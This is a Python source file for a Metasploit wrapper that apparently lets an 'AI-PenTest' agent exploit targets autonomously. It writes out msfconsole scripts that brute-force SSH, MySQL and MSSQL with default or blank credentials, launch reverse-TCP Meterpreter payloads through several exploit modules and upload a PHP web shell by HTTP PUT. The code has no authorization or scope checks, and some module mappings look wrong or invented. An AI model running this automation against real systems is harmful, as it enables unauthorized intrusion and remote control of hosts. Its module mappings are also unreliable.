#!/usr/bin/env python3
"""
Metasploit Wrapper for AI-PenTest Exploitation Agent
Comprehensive interface for Metasploit Framework exploitation
"""

import json
import logging
import subprocess
import time
import re
import tempfile
import os
from datetime import datetime
from pathlib import Path
import xml.etree.ElementTree as ET

class MetasploitWrapper:
    """
    Comprehensive Metasploit wrapper for various exploitation scenarios
    """
    
    def __init__(self):
        """Initialize Metasploit wrapper"""
        self.logger = logging.getLogger("MetasploitWrapper")
        self.session_info = {}
        self.active_sessions = []
        
        # Metasploit paths
        self.msfconsole = "msfconsole"
        self.msfvenom = "msfvenom"
        self.msfrpcd = "msfrpcd"
        
        # Common payloads by platform
        self.payloads = {
            'linux': {
                'x86': 'linux/x86/meterpreter/reverse_tcp',
                'x64': 'linux/x64/meterpreter/reverse_tcp',
                'shell': 'linux/x86/shell_reverse_tcp'
            },
            'windows': {
                'x86': 'windows/meterpreter/reverse_tcp',
                'x64': 'windows/x64/meterpreter/reverse_tcp',
                'shell': 'windows/shell_reverse_tcp'
            },
            'php': 'php/meterpreter/reverse_tcp',
            'python': 'python/meterpreter/reverse_tcp',
            'java': 'java/meterpreter/reverse_tcp'
        }
        
        self.logger.info("Metasploit wrapper initialized")
    
    def execute_exploit(self, exploit_module, target, payload=None, options=None):
        """Execute a specific Metasploit exploit module"""
        self.logger.info(f"Executing Metasploit exploit: {exploit_module}")
        
        try:
            # Prepare Metasploit commands
            commands = [
                f"use {exploit_module}",
                f"set RHOSTS {target}",
            ]
            
            # Set payload if specified
            if payload:
                commands.append(f"set PAYLOAD {payload}")
            
            # Set additional options
            if options:
                for key, value in options.items():
                    commands.append(f"set {key} {value}")
            
            # Add exploitation command
            commands.extend([
                "exploit -z",
                "sessions -l",
                "exit"
            ])
            
            # Execute via msfconsole
            result = self._execute_msfconsole_commands(commands)
            
            # Parse results
            exploitation_result = self._parse_exploitation_result(result, exploit_module)
            
            return exploitation_result
            
        except Exception as e:
            self.logger.error(f"Metasploit exploit execution failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'tool': 'metasploit',
                'module': exploit_module
            }
    
    def execute_sql_injection(self, plan_entry):
        """Execute SQL injection exploits using Metasploit modules"""
        self.logger.info("Executing SQL injection via Metasploit...")
        
        target = plan_entry.get('target', '')
        injection_point = plan_entry.get('injection_point', '')
        
        # SQL injection modules to try
        sql_modules = [
            {
                'module': 'auxiliary/scanner/http/sqlmap',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'RPORT': self._extract_port_from_url(target),
                    'TARGETURI': self._extract_path_from_url(target),
                    'VERBOSE': 'true'
                }
            },
            {
                'module': 'auxiliary/scanner/mssql/mssql_login',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'USERNAME': 'sa',
                    'PASSWORD': '',
                    'VERBOSE': 'true'
                }
            },
            {
                'module': 'auxiliary/scanner/mysql/mysql_login',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'USERNAME': 'root',
                    'BLANK_PASSWORDS': 'true',
                    'VERBOSE': 'true'
                }
            },
            {
                'module': 'auxiliary/admin/http/tomcat_administration',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'RPORT': self._extract_port_from_url(target),
                    'VERBOSE': 'true'
                }
            }
        ]
        
        results = []
        
        for sql_config in sql_modules:
            try:
                result = self.execute_exploit(
                    exploit_module=sql_config['module'],
                    target=target,
                    options=sql_config['options']
                )
                results.append(result)
                
                if result.get('success'):
                    break  # Stop on first success
                    
            except Exception as e:
                self.logger.error(f"SQL injection module {sql_config['module']} failed: {e}")
        
        return self._combine_sql_results(results)
    
    def execute_ssh_exploit(self, plan_entry):
        """Execute SSH exploitation using various Metasploit modules"""
        self.logger.info("Executing SSH exploitation via Metasploit...")
        
        target = plan_entry.get('target', '')
        host = self._extract_host_from_url(target)
        
        # SSH exploitation modules
        ssh_modules = [
            {
                'module': 'auxiliary/scanner/ssh/ssh_login',
                'options': {
                    'RHOSTS': host,
                    'USERNAME': 'root',
                    'BLANK_PASSWORDS': 'true',
                    'USER_AS_PASS': 'true',
                    'VERBOSE': 'true'
                }
            },
            {
                'module': 'auxiliary/scanner/ssh/ssh_login',
                'options': {
                    'RHOSTS': host,
                    'USERPASS_FILE': '/usr/share/metasploit-framework/data/wordlists/ssh_default_userpass.txt',
                    'VERBOSE': 'true'
                }
            },
            {
                'module': 'exploit/linux/ssh/sshexec',
                'payload': 'linux/x86/meterpreter/reverse_tcp',
                'options': {
                    'RHOSTS': host,
                    'USERNAME': 'root',
                    'PASSWORD': '',
                    'LHOST': self._get_local_ip(),
                    'LPORT': '4444'
                }
            },
            {
                'module': 'auxiliary/scanner/ssh/ssh_version',
                'options': {
                    'RHOSTS': host,
                    'VERBOSE': 'true'
                }
            }
        ]
        
        results = []
        
        for ssh_config in ssh_modules:
            try:
                result = self.execute_exploit(
                    exploit_module=ssh_config['module'],
                    target=target,
                    payload=ssh_config.get('payload'),
                    options=ssh_config['options']
                )
                results.append(result)
                
                if result.get('success') and result.get('session_info'):
                    break  # Stop on successful shell
                    
            except Exception as e:
                self.logger.error(f"SSH module {ssh_config['module']} failed: {e}")
        
        return self._combine_ssh_results(results)
    
    def execute_command_injection(self, plan_entry):
        """Execute command injection exploits"""
        self.logger.info("Executing command injection via Metasploit...")
        
        target = plan_entry.get('target', '')
        
        # Command injection modules
        cmd_modules = [
            {
                'module': 'exploit/multi/http/php_cgi_arg_injection',
                'payload': 'php/meterpreter/reverse_tcp',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'RPORT': self._extract_port_from_url(target),
                    'LHOST': self._get_local_ip(),
                    'LPORT': '4444'
                }
            },
            {
                'module': 'exploit/unix/webapp/php_include',
                'payload': 'php/meterpreter/reverse_tcp',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'RPORT': self._extract_port_from_url(target),
                    'LHOST': self._get_local_ip(),
                    'LPORT': '4445'
                }
            },
            {
                'module': 'auxiliary/scanner/http/http_put',
                'options': {
                    'RHOSTS': self._extract_host_from_url(target),
                    'RPORT': self._extract_port_from_url(target),
                    'PATH': '/test.txt',
                    'DATA': '<?php system($_GET["cmd"]); ?>'
                }
            }
        ]
        
        results = []
        
        for cmd_config in cmd_modules:
            try:
                result = self.execute_exploit(
                    exploit_module=cmd_config['module'],
                    target=target,
                    payload=cmd_config.get('payload'),
                    options=cmd_config['options']
                )
                results.append(result)
                
            except Exception as e:
                self.logger.error(f"Command injection module {cmd_config['module']} failed: {e}")
        
        return self._combine_cmd_results(results)
    
    def execute_generic_exploit(self, plan_entry):
        """Execute generic exploitation based on vulnerability type"""
        self.logger.info("Executing generic Metasploit exploitation...")
        
        vuln_type = plan_entry.get('vulnerability_type', '').lower()
        target = plan_entry.get('target', '')
        
        # Map vulnerability types to modules
        generic_modules = self._get_modules_by_vuln_type(vuln_type)
        
        results = []
        
        for module_config in generic_modules:
            try:
                result = self.execute_exploit(
                    exploit_module=module_config['module'],
                    target=target,
                    payload=module_config.get('payload'),
                    options=module_config.get('options', {})
                )
                results.append(result)
                
                if result.get('success'):
                    break  # Stop on first success
                    
            except Exception as e:
                self.logger.error(f"Generic module {module_config['module']} failed: {e}")
        
        return self._combine_generic_results(results)
    
    def _get_modules_by_vuln_type(self, vuln_type):
        """Get appropriate Metasploit modules based on vulnerability type"""
        
        module_mappings = {
            'xss': [
                {
                    'module': 'auxiliary/scanner/http/http_traversal',
                    'options': {'DEPTH': '10'}
                }
            ],
            'csrf': [
                {
                    'module': 'auxiliary/scanner/http/csrf',
                    'options': {'VERBOSE': 'true'}
                }
            ],
            'lfi': [
                {
                    'module': 'auxiliary/scanner/http/dir_traversal',
                    'options': {'DEPTH': '7'}
                },
                {
                    'module': 'exploit/multi/http/php_include',
                    'payload': 'php/meterpreter/reverse_tcp'
                }
            ],
            'rfi': [
                {
                    'module': 'exploit/unix/webapp/php_include',
                    'payload': 'php/meterpreter/reverse_tcp'
                }
            ],
            'upload': [
                {
                    'module': 'exploit/multi/http/upload_exec',
                    'payload': 'php/meterpreter/reverse_tcp'
                }
            ],
            'default': [
                {
                    'module': 'auxiliary/scanner/http/http_version',
                    'options': {'VERBOSE': 'true'}
                },
                {
                    'module': 'auxiliary/scanner/http/dir_scanner',
                    'options': {'DICTIONARY': '/usr/share/metasploit-framework/data/wordlists/directory.txt'}
                }
            ]
        }
        
        # Find matching modules
        for key in module_mappings:
            if key in vuln_type:
                return module_mappings[key]
        
        return module_mappings['default']
    
    def _execute_msfconsole_commands(self, commands):
        """Execute commands via msfconsole"""
        try:
            # Create resource file with commands
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                for cmd in commands:
                    f.write(f"{cmd}\n")
                resource_file = f.name
            
            # Execute msfconsole with resource file
            cmd = [self.msfconsole, '-q', '-r', resource_file]
            
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=600  # 10 minute timeout
            )
            
            # Clean up resource file
            os.unlink(resource_file)
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'success': result.returncode == 0
            }
            
        except subprocess.TimeoutExpired:
            self.logger.error("Metasploit execution timeout")
            return {
                'stdout': '',
                'stderr': 'Timeout expired',
                'returncode': -1,
                'success': False
            }
        except Exception as e:
            self.logger.error(f"Metasploit execution failed: {e}")
            return {
                'stdout': '',
                'stderr': str(e),
                'returncode': -1,
                'success': False
            }
    
    def _parse_exploitation_result(self, result, module):
        """Parse Metasploit exploitation results"""
        stdout = result.get('stdout', '')
        stderr = result.get('stderr', '')
        
        # Check for session creation
        session_match = re.search(r'Meterpreter session (\d+) opened', stdout)
        shell_match = re.search(r'Command shell session (\d+) opened', stdout)
        
        exploitation_result = {
            'success': False,
            'module': module,
            'tool': 'metasploit',
            'output': stdout,
            'error': stderr,
            'timestamp': datetime.now().isoformat()
        }
        
        if session_match:
            session_id = session_match.group(1)
            exploitation_result.update({
                'success': True,
                'session_type': 'meterpreter',
                'session_id': session_id,
                'session_info': {
                    'id': session_id,
                    'type': 'meterpreter',
                    'created': datetime.now().isoformat()
                }
            })
            self.active_sessions.append(session_id)
            
        elif shell_match:
            session_id = shell_match.group(1)
            exploitation_result.update({
                'success': True,
                'session_type': 'shell',
                'session_id': session_id,
                'session_info': {
                    'id': session_id,
                    'type': 'shell',
                    'created': datetime.now().isoformat()
                }
            })
            self.active_sessions.append(session_id)
            
        # Check for other success indicators
        elif any(indicator in stdout.lower() for indicator in [
            'exploit completed', 'vulnerable', 'login successful', 
            'authentication successful', 'exploit succeeded'
        ]):
            exploitation_result['success'] = True
        
        return exploitation_result
    
    def _combine_sql_results(self, results):
        """Combine SQL injection results"""
        combined = {
            'success': False,
            'method': 'metasploit_sql_injection',
            'attempts': len(results),
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        
        for result in results:
            if result.get('success'):
                combined['success'] = True
                combined['successful_module'] = result.get('module')
                if result.get('session_info'):
                    combined['session_info'] = result['session_info']
                break
        
        return combined
    
    def _combine_ssh_results(self, results):
        """Combine SSH exploitation results"""
        combined = {
            'success': False,
            'method': 'metasploit_ssh_exploit',
            'attempts': len(results),
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        
        for result in results:
            if result.get('success'):
                combined['success'] = True
                combined['successful_module'] = result.get('module')
                if result.get('session_info'):
                    combined['session_info'] = result['session_info']
                break
        
        return combined
    
    def _combine_cmd_results(self, results):
        """Combine command injection results"""
        combined = {
            'success': False,
            'method': 'metasploit_command_injection',
            'attempts': len(results),
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        
        for result in results:
            if result.get('success'):
                combined['success'] = True
                combined['successful_module'] = result.get('module')
                if result.get('session_info'):
                    combined['session_info'] = result['session_info']
                break
        
        return combined
    
    def _combine_generic_results(self, results):
        """Combine generic exploitation results"""
        combined = {
            'success': False,
            'method': 'metasploit_generic_exploit',
            'attempts': len(results),
            'results': results,
            'timestamp': datetime.now().isoformat()
        }
        
        for result in results:
            if result.get('success'):
                combined['success'] = True
                combined['successful_module'] = result.get('module')
                if result.get('session_info'):
                    combined['session_info'] = result['session_info']
                break
        
        return combined
    
    def _extract_host_from_url(self, url):
        """Extract host from URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        return parsed.hostname or url
    
    def _extract_port_from_url(self, url):
        """Extract port from URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        if parsed.port:
            return str(parsed.port)
        elif parsed.scheme == 'https':
            return '443'
        else:
            return '80'
    
    def _extract_path_from_url(self, url):
        """Extract path from URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        return parsed.path or '/'
    
    def _get_local_ip(self):
        """Get local IP address for reverse connections"""
        import socket
        try:
            # Connect to a remote address to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return '127.0.0.1'
    
    def get_active_sessions(self):
        """Get list of active Metasploit sessions"""
        commands = [
            "sessions -l",
            "exit"
        ]
        
        result = self._execute_msfconsole_commands(commands)
        
        return {
            'active_sessions': self.active_sessions,
            'session_list_output': result.get('stdout', ''),
            'timestamp': datetime.now().isoformat()
        }
    
    def cleanup_sessions(self):
        """Clean up active Metasploit sessions"""
        if self.active_sessions:
            commands = []
            for session_id in self.active_sessions:
                commands.append(f"sessions -k {session_id}")
            commands.append("exit")
            
            result = self._execute_msfconsole_commands(commands)
            self.active_sessions.clear()
            
            return result
        
        return {'message': 'No active sessions to clean up'}